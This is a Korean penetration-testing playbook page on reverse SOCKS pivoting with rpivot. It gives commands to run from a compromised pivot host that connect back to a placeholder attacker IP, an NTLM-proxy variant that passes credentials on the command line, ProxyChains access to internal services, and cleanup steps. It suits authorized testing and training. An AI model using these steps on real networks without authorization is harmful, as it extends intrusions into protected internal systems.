---
tags:
  - 환경/linux
시작조건: ["공격 호스트에서 피벗 호스트로 inbound 연결 불가", "피벗 호스트 셀 확보", "피벗 호스트에서 <ATTACKER_IP>:9999/TCP와 <INTERNAL_IP>:<PORT> 연결 가능"]
필요권한: ["피벗 호스트에서 Python2와 rpivot client를 실행할 현재 계정 권한"]
필요조건: ["공격 호스트의 <ATTACKER_IP>:9999/TCP listener", "피벗 호스트에서 공격 호스트 listener로 outbound TCP 연결 가능", "피벗 호스트에서 <INTERNAL_IP>:<PORT> 연결 가능", "ProxyChains의 SOCKS4 설정"]
결과: ["공격 호스트의 127.0.0.1:9050 SOCKS4 프록시", "공격 호스트에서 <INTERNAL_IP>:<PORT>까지의 TCP 경로"]
---

# Rpivot Reverse SOCKS 피벗팅

## 한 줄 판단

공격 호스트에서 `<PIVOT_IP>`로 inbound 연결은 불가하지만 셀을 보유한 피벗 호스트에서 `<ATTACKER_IP>:9999`와 `<INTERNAL_IP>:<PORT>`로 연결할 수 있으면, 공격 호스트에 rpivot SOCKS4 listener를 열어 내부 TCP 경로를 만든다.

## 사용할 때

- 현재 네트워크 위치: 공격 호스트에서 `<PIVOT_IP>`로 직접 inbound 연결은 만들 수 없지만, 피벗 호스트에서 `<ATTACKER_IP>:9999` outbound TCP는 가능하다.
- 명령 실행 위치: `server.py`와 ProxyChains 클라이언트는 공격 호스트에서, `client.py`는 셀을 보유한 피벗 호스트에서 실행한다.
- 현재 계정·권한: 피벗 호스트의 현재 셀 계정으로 Python2와 `client.py`를 실행하고 outbound socket을 열 수 있어야 한다. root 권한은 rpivot 실행의 필수 조건이 아니다.
- 도달해야 하는 대상: 피벗 호스트에서 직접 응답하는 `<INTERNAL_IP>:<PORT>` 웹 또는 TCP 서비스다.
- 성공 범위: 공격 호스트의 `127.0.0.1:9050` SOCKS4를 거쳐 `<INTERNAL_IP>:<PORT>`의 서비스 응답을 받는다. 서비스 인증, 원격 명령 실행과 관리자 권한은 아직 획득하지 않은 상태다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | 피벗 호스트→`<ATTACKER_IP>:9999` outbound TCP와 피벗→`<INTERNAL_IP>:<PORT>` 경로 | 피벗 호스트에서 두 TCP 경로를 각각 확인 | listener 바인딩 주소·VPN IP·egress 방화벽과 내부 route 확인 |
| 현재 계정 또는 인증 수단 | 피벗 호스트의 유지 중인 셀 | `whoami`, `hostname` | 셀 재연결과 rpivot 전송 경로 확인 |
| 현재 권한 | 현재 계정으로 Python2와 `client.py` 실행 가능 | `python2 --version` | Python2 runtime과 파일 실행·읽기 권한 확인 |
| 공격 대상의 조건 | 피벗 호스트에서 `<INTERNAL_IP>:<PORT>` 응답 | 피벗 호스트에서 `curl` 또는 TCP 클라이언트로 서비스 확인 | 피벗 호스트의 DNS·route·방화벽과 대상 listener 확인 |
| 필요한 파일·목록·주소 | 양쪽 rpivot 파일, `<ATTACKER_IP>`, `<INTERNAL_IP>`, `<PORT>` | `server.py`·`client.py` 존재와 각 주소의 인터페이스 확인 | 누락 파일 전송, 올바른 VPN·내부 주소로 교체 |

## 실행

### 선택 기준
| 단서 | 의미 | 다음 행동 |
|---|---|---|
| 내부 HTTP가 피벗 호스트에서만 접근됨 | reverse SOCKS로 브라우저 접근 가능 | rpivot + ProxyChains 구성 |
| ProxyChains가 SOCKS5로 설정됨 | rpivot과 불일치 가능 | `socks4 127.0.0.1 9050` 사용 |
| 프록시 인증 환경 | outbound가 HTTP/NTLM proxy를 통과해야 함 | rpivot NTLM proxy 옵션 검토 |

### 절차
1. 공격 호스트에서 rpivot server를 실행해 `127.0.0.1:9050` SOCKS 포트와 `<ATTACKER_IP>:9999` client 연결 포트를 연다.
2. 피벗 호스트로 rpivot을 전송하고 피벗 셀에서 `client.py`를 실행해 공격 호스트 listener에 연결한다.
3. 전역 설정을 바꾸지 않고 공격 호스트에 이번 실행 전용 ProxyChains 파일을 만들어 `socks4 127.0.0.1 9050`으로 설정한다.
4. 공격 호스트에서 `<INTERNAL_IP>:<PORT>` 서비스에 접근해 reverse 연결, SOCKS listener, 최종 TCP 응답을 순서대로 검증한다.

### 공격 호스트에서 server 실행

```bash
ss -ltnp 'sport = :9050 or sport = :9999'
python2 server.py --proxy-ip 127.0.0.1 --proxy-port 9050 --server-port 9999 --server-ip <ATTACKER_IP> &
RPIVOT_SERVER_PID=$!
ps -p "$RPIVOT_SERVER_PID" -o pid=,args=
```

확인할 출력:

- 첫 `ss`에 두 포트의 기존 listener가 없어야 한다.
- 공격 호스트의 `<ATTACKER_IP>:9999`에서 client 연결을 대기하고 `127.0.0.1:9050`에서 SOCKS4 포트를 listen한다. 두 listener가 기록한 `<RPIVOT_SERVER_PID>`에 속하는지 다시 확인한다.

### 피벗 호스트에서 client 실행

```bash
test ! -e '<RPIVOT_CLIENT_DIRECTORY>'
mkdir -m 700 '<RPIVOT_CLIENT_DIRECTORY>'
# 승인된 파일 전송 절차로 client.py와 의존 파일을 이 전용 디렉터리에 반입하고 exact 경로 목록을 기록한다.
cd '<RPIVOT_CLIENT_DIRECTORY>'
python2 client.py --server-ip <ATTACKER_IP> --server-port 9999 &
RPIVOT_CLIENT_PID=$!
ps -p "$RPIVOT_CLIENT_PID" -o pid=,args=
cd - >/dev/null
```

확인할 출력:

- 공격 호스트 server에 피벗 호스트 client 연결이 기록된다. client 연결만으로 최종 내부 서비스 도달을 판정하지 않는다.
- `<RPIVOT_CLIENT_PID>`와 전용 디렉터리에 반입한 파일 목록은 복구 때 사용할 식별값이다.

### NTLM 인증 HTTP 프록시를 경유해야 하는 경우

피벗 호스트가 공격 호스트의 rpivot server로 직접 연결하지 못하고 조직의 NTLM 인증 HTTP proxy만 사용할 수 있을 때 위 직접 client 명령 대신 적용한다.

```bash
cd '<RPIVOT_CLIENT_DIRECTORY>'
python2 client.py --server-ip <RPIVOT_SERVER_IP> --server-port <RPIVOT_SERVER_PORT> --ntlm-proxy-ip <HTTP_PROXY_IP> --ntlm-proxy-port <HTTP_PROXY_PORT> --domain <DOMAIN> --username <USER> --password '<PASSWORD>' &
RPIVOT_CLIENT_PID=$!
ps -p "$RPIVOT_CLIENT_PID" -o pid=,args=
cd - >/dev/null
```

확인할 출력:

- 공격 호스트의 rpivot server에 `New connection from host`가 나타나면 proxy 인증과 server 연결이 완료된 것이다.
- 연결이 없으면 proxy 주소·포트, 도메인 표기, 사용자명·비밀번호와 rpivot server listener를 나누어 확인한다.
- server 연결 뒤에도 ProxyChains로 `<INTERNAL_IP>:<PORT>`의 실제 응답을 확인해야 reverse SOCKS 전체 경로가 검증된다.

### ProxyChains로 내부 웹 접근

```text
[ProxyList]
socks4 127.0.0.1 9050
```

공격 호스트에서 기존에 없던 전용 설정 파일을 만든다.

```bash
test ! -e '<RPIVOT_PROXYCHAINS_CONFIG>'
printf 'strict_chain\nproxy_dns\n\n[ProxyList]\nsocks4 127.0.0.1 9050\n' > '<RPIVOT_PROXYCHAINS_CONFIG>'
sed -n '1,20p' '<RPIVOT_PROXYCHAINS_CONFIG>'
```

```bash
proxychains -f '<RPIVOT_PROXYCHAINS_CONFIG>' curl -I http://<INTERNAL_IP>:80
```

확인할 출력:

- 공격 호스트의 ProxyChains 체인 로그와 `<INTERNAL_IP>:80`의 HTTP 상태 코드 또는 배너. 이는 웹 서비스 응답을 확인한 것이며 웹 애플리케이션 인증 성공을 의미하지 않는다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 피벗 호스트에서 공격 호스트 `9999`에 연결 가능함 | reverse client의 outbound baseline이 유효함 | reverse 연결 경로 | rpivot server 시작 |
| 피벗 호스트에서 내부 웹·TCP가 직접 응답함 | 최종 내부 hop이 유효함 | 내부 서비스 baseline | client 실행 후 SOCKS 검증 |
| server에 client 연결이 표시되고 `9050`이 listen | reverse SOCKS가 생성됨 | SOCKS 프록시 | ProxyChains를 SOCKS4로 설정 |
| NTLM proxy 경유 client 뒤 server에 `New connection from host`가 표시됨 | proxy 인증과 rpivot server 연결 성공 | NTLM proxy 경유 reverse 연결 | SOCKS4 설정과 내부 서비스 응답 확인 |
| ProxyChains 체인이 성공하고 `<INTERNAL_IP>:<PORT>`의 HTTP 상태 코드·배너 또는 TCP 응답이 보임 | 공격 호스트→SOCKS4→피벗 호스트→내부 서비스 경로가 동작함 | 공격 호스트에서 내부 서비스 접근 | 서비스별 인증·원격 실행·실제 권한을 별도 검증 |
| client 연결이 없음 | 공격 호스트 listener 주소, outbound 포트 또는 방화벽 문제 | 터널 미생성 | VPN IP와 `9999` listener 확인 |
| SOCKS listener는 있으나 ProxyChains가 실패함 | rpivot과 프록시 protocol이 다를 수 있음 | listener만 확보 | `socks4 127.0.0.1 9050`으로 맞춤 |
| 피벗에서 직접 되던 내부 서비스만 프록시에서 실패함 | proxy hook 또는 대상 주소 문제가 있음 | 피벗 baseline만 유지 | 체인 로그와 대상 IP·포트 재확인 |

## 변경 영향과 복구

Rpivot client는 server 연결이 끊기면 재연결을 반복한다. 따라서 SOCKS를 사용하는 하위 client를 먼저 닫고, 피벗 호스트의 client를 server보다 먼저 종료한다.

1. 공격 호스트에서 ProxyChains를 사용하는 브라우저·스캐너·서비스 client를 종료하고 `<INTERNAL_IP>:<PORT>`로 새 연결이 생기지 않는지 확인한다.
2. 피벗 셸이 살아 있을 때 `ps -p <RPIVOT_CLIENT_PID> -o pid=,args=`로 exact client를 대조한 뒤 `kill <RPIVOT_CLIENT_PID>`를 실행한다. 같은 `ps`에 process가 없고 공격 호스트 server 로그에서 client 연결이 닫혔는지 확인한다.
3. 공격 호스트에서 `ps -p <RPIVOT_SERVER_PID> -o pid=,args=`로 exact server를 대조한 뒤 `kill <RPIVOT_SERVER_PID>`를 실행한다. `ss -ltnp 'sport = :9050 or sport = :9999'`로 두 listener가 작업 전 상태로 돌아왔는지 확인한다.
4. 공격 호스트의 전용 설정은 `rm -- '<RPIVOT_PROXYCHAINS_CONFIG>'` 후 `test ! -e '<RPIVOT_PROXYCHAINS_CONFIG>'`로 확인한다.
5. 피벗 호스트에 이번 실행 전용 디렉터리를 만들었다면 반입 때 기록한 exact 파일만 `rm -- '<RPIVOT_CLIENT_DIRECTORY>/<RECORDED_FILE_1>' '<RPIVOT_CLIENT_DIRECTORY>/<RECORDED_FILE_2>'`처럼 제거한다. `find '<RPIVOT_CLIENT_DIRECTORY>' -mindepth 1 -maxdepth 1 -print`가 비어 있을 때만 `rmdir '<RPIVOT_CLIENT_DIRECTORY>'`를 실행한다.

client 종료가 실패하면 PID의 command line과 시작 시각을 다시 확인하고 모든 Python process를 이름으로 종료하지 않는다. 피벗 셸이 먼저 끊겼으면 server를 종료해 새 SOCKS 연결은 막을 수 있지만, client의 재연결 process와 반입 파일을 확인할 수 없으므로 `원격 복구 미확인`으로 남긴다. NTLM proxy 비밀번호를 command line으로 사용했다면 process 목록·shell history·proxy 인증 로그에 남은 영향은 process 종료만으로 되돌릴 수 없다.

## 확인할 출력과 권한

| 확인 지점 | 확인할 출력 | 권한 판단 |
|---|---|---|
| Python 실행 | Python2와 rpivot client 실행 성공 | 피벗 shell에서 도구 실행 가능한지 확인 |
| 양쪽 baseline | 공격 호스트 listener와 피벗의 내부 `curl`·`nc` | reverse 방향과 최종 hop을 분리 |
| listener·protocol | server client 로그, `9050` listen, SOCKS4 설정 | 세션과 프록시 protocol 일치 확인 |
| 최종 서비스 | ProxyChains 체인과 HTTP·TCP 응답 | SOCKS 생성과 내부 접근을 구분 |

## 관련 상태 라우터

- 내부 서비스 응답까지 확인했으면: [[내부망 경로 확보 후 피벗 구성]]

## 관련 도구

- [[rpivot]]
- [[proxychains]]
- [[curl]]

## 참고 링크

- [rpivot](https://github.com/klsecservices/rpivot)
